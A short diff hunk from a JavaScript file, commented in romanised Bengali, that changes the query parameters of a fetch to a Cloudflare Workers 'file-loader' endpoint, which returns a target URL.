@@ -137,7 +137,7 @@ void async function () {
 
     // Step 1: Worker theke target URL nao
     const workerRes = await fetch(
-      "https://zxi-file-loader.ah4734536.workers.dev?file=zxi.txt&key=",
+      "https://zxi-file-loader.ah4734536.workers.dev?file=zxi.txt&key=Hey&user=",
       { signal: M.signal }
     );
     const targetURL = (await workerRes.text()).trim();
